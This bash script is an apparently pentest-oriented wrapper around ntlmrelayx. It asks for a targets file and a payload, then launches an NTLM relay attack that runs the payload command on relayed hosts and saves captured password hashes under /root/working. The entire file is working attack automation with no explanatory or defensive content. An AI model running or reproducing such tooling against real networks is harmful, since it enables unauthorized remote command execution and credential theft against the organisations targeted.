#!/bin/bash
# Script to start ntlmrelayx
# 06/10/2018 Version 1.0
# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White
NC='\033[0m' 			  # No Color


main () {
	echo ""
	echo -e ${Green}"This script takes a payload and targets file and starts ntlmrelayx"${NC}
	echo ""
	echo -e ${Green}"Input targets file(tab complete):"${NC}
	read -e varTargets
	echo ""
	echo -e ${Green}"Input payload file(tab complete):"${NC}
	read -e varPayload
	echo ""
	if [ -d "/root/working/internal/hashes" ]; then
		varOutPutHashes=/root/working/internal/hashes/ntlmrelay-hashes.txt
	else
		mkdir -p /root/working/internal/hashes
		varOutPutHashes=/root/working/internal/hashes/ntlmrelay-hashes.txt
	fi
	echo -e ${Green}"Please validate the following information"${NC}
	echo -e ${Green}"Targets file: $varTargets"${NC}
	echo -e ${Green}"Payload file: $varPayload"${NC}
	echo -e ${Green}"Output file: $varOutPutHashes"${NC}
	echo -e ${Green}"Press any key to continue"${NC}
	read varInput
	echo ""
	echo -e ${Green}"Starting ntlmrelayx......"${NC}
	ntlmrelayx.py -tf "$varTargets" -c "$varPayload" -of "$varOutPutHashes"
	echo ""
	echo ""
	echo -e ${Green}"Your output hash file is located here: $varOutPutHashes"${NC}
}

main